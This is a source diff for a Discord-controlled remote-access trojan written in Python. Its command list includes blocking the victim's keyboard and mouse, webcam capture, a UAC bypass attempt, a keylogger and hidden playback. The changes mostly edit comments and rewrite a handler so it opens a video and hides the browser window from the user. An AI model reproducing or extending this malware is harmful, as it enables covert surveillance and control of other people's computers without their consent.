@@ -44,7 +44,7 @@ Availaible commands are :
 --> !volumemax = Put volume at 100%
 --> !volumezero = Put volume at 0%
 --> !idletime = Get the idle time of user's on target computer
---> !sing = Play chosen video in background
+--> !sing = Play chosen video in background (Only works with youtube links)
 --> !stopsing = Stop video playing in background
 --> !blockinput = Blocks user's keyboard and mouse / Warning : Admin rights are required
 --> !unblockinput = Unblocks user's keyboard and mouse / Warning : Admin rights are required
@@ -135,7 +135,7 @@ async def on_message(message):
     else:
         if message.content.startswith("!kill"):
             if message.content[6:] == "all":
-                for y in range(len(on_ready.total)): #Probably a better way to do this
+                for y in range(len(on_ready.total)): 
                     if "session" in on_ready.total[y]:
                         channel_to_delete = discord.utils.get(client.get_all_channels(), name=on_ready.total[y])
                         await channel_to_delete.delete()
@@ -192,7 +192,7 @@ async def on_message(message):
             volumedown()
             await message.channel.send("[*] Volume put to 0%")
 
-        if message.content == "!webcampic":
+        if message.content == "!webcampic": #Downloads a file over internet which is not great but avoids using opencv/numpy which helps reducing final exe file if compiled
             import os
             import urllib.request
             from zipfile import ZipFile
@@ -231,8 +231,8 @@ async def on_message(message):
             import win32gui
             import time
             time.sleep(1)
-            hwnd = win32gui.FindWindow(None, "Error")
-            win32gui.ShowWindow(hwnd, win32con.SW_RESTORE)
+            hwnd = win32gui.FindWindow(None, "Error") 
+            win32gui.ShowWindow(hwnd, win32con.SW_RESTORE) #Put message to foreground
             win32gui.SetWindowPos(hwnd,win32con.HWND_NOTOPMOST, 0, 0, 0, 0, win32con.SWP_NOMOVE + win32con.SWP_NOSIZE)
             win32gui.SetWindowPos(hwnd,win32con.HWND_TOPMOST, 0, 0, 0, 0, win32con.SWP_NOMOVE + win32con.SWP_NOSIZE)  
             win32gui.SetWindowPos(hwnd,win32con.HWND_NOTOPMOST, 0, 0, 0, 0, win32con.SWP_SHOWWINDOW + win32con.SWP_NOMOVE + win32con.SWP_NOSIZE)
@@ -340,9 +340,7 @@ async def on_message(message):
 
         if message.content.startswith("!stopsing"):
             import os 
-            os.system("taskkill /F /IM iexplore.exe")
-            os.chdir(appdata)
-            os.system("del x0.vbs")
+            os.system(f"taskkill /F /IM {pid_process[1]}")
 
         if message.content == "!sysinfo":
             import platform
@@ -383,7 +381,6 @@ async def on_message(message):
                         isadmin = True
                 return isadmin, groups
             is_admin, groups = if_user_is_admin(server)
-            # Result handeling
             if is_admin == True:
                 print('User in admin group trying to bypass uac')
                 import os
@@ -452,19 +449,37 @@ async def on_message(message):
                     execute()
             else:
                 print("failed")
-                await message.channel.send("[*] Command failed : User not in administator group")
+                await message.channel.send("[*] Command failed : User not in administrator group")
 
-        if message.content.startswith("!sing"):
-            import os  #Bad code that I wrote long ago but since it's a dumb command it's not too big of a problem
+        if message.content.startswith("!sing"): # This is awfully complicated for such a dumb command I don't know why I wasted time doing this.
             volumeup()
-            os.chdir(appdata)   
-            choice = message.content[6:]
-            f1 = open('x0.vbs', 'a')
-            f1.write('Set ie = CreateObject("InternetExplorer.Application")' + "\r\n")
-            f1.write("ie.Visible = 0" + "\r\n")
-            f1.write('ie.Navigate2' + ' ' + '"' + choice + '"')
-            f1.close()
-            os.system('x0.vbs')
+            from win32 import win32gui
+            import win32con
+            import win32gui
+            from win32con import SW_HIDE
+            import win32process
+            import os
+            link = message.content[6:]
+            if link.startswith("http"):
+                link = link[link.find('www'):]
+            os.system(f'start {link}')
+            while True:
+                def get_all_hwnd(hwnd,mouse):
+                    def winEnumHandler(hwnd, ctx):
+                        if win32gui.IsWindowVisible(hwnd):
+                            if "youtube" in (win32gui.GetWindowText(hwnd).lower()):
+                                win32gui.ShowWindow(hwnd, SW_HIDE)
+                                global pid_process
+                                pid_process = win32process.GetWindowThreadProcessId(hwnd)
+                                return "ok"
+                        else:
+                            pass
+                    if win32gui.IsWindow(hwnd) and win32gui.IsWindowEnabled(hwnd) and win32gui.IsWindowVisible(hwnd):
+                        win32gui.EnumWindows(winEnumHandler,None)
+                try:
+                    win32gui.EnumWindows(get_all_hwnd, 0)
+                except:
+                    break
 
         if message.content == "!startkeylogger":
             import base64
@@ -520,6 +535,7 @@ async def on_message(message):
 
         if message.content.startswith("!voice"):
             volumeup()
+            import comtypes
             import win32com.client as wincl
             speak = wincl.Dispatch("SAPI.SpVoice")
             speak.Speak(message.content[7:])
